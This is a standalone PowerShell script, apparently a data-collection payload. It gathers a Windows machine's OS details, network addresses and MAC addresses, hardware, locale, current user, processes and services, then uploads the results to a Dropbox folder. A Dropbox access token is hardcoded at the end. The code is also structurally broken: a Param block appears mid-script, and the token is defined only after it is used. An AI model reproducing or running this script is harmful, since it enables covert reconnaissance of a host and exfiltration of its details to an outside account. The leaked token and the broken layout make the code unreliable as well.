# Example usage (replace with your actual file paths)
$sourceFilePath = "$env:USERPROFILE\Downloads\output_filename.txt"
$targetFilePath = "/Scripts/output.txt" # Uploads to the "/Scripts" folder in your Dropbox

# Gather System Information
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $sourceFilePath
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength >> $sourceFilePath
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status >> $sourceFilePath
Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors >> $sourceFilePath
Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum >> $sourceFilePath
Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType >> $sourceFilePath
Get-WinHomeLocation >> $sourceFilePath
Get-WinSystemLocale >> $sourceFilePath
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) >> $sourceFilePath
$currentUser.Identity.Name >> $sourceFilePath
Get-Process >> $sourceFilePath
Get-Service >> $sourceFilePath

Param(
    [Parameter(Mandatory = $true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory = $true)]
    [string]$TargetFilePath   

)

# Construct the Dropbox-API-Arg JSON
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'

# Retrieve the Dropbox access token from the environment variable
$authorization = "Bearer " + (Get-Item env:DropBoxAccessToken).Value

# Create the headers for the request
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg",   
 $arg)
$headers.Add("Content-Type", 'application/octet-stream')   


# Make the API call to upload the file
try {
    $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
    Write-Host "File uploaded to Dropbox successfully!"
}
catch {
    Write-Error "Error uploading file to Dropbox: $($_.Exception.Message)"
}

# Dropbox Configuration 
$env:DropBoxAccessToken = "sl.B7tscX1_hb2KUSOe5XaCxajd-CtxwSylQBEYFbiykfYJ-thV3tJpUw2iNG0zBes-x9oeuPUBMbikluXZQwj_uaGY437N_LUeQxgfgCr4BSLQJtgOZrE4pE3w0_Yms2lK2f-S_x6fiJLN"
$dropboxFolderPath = "/Scripts"
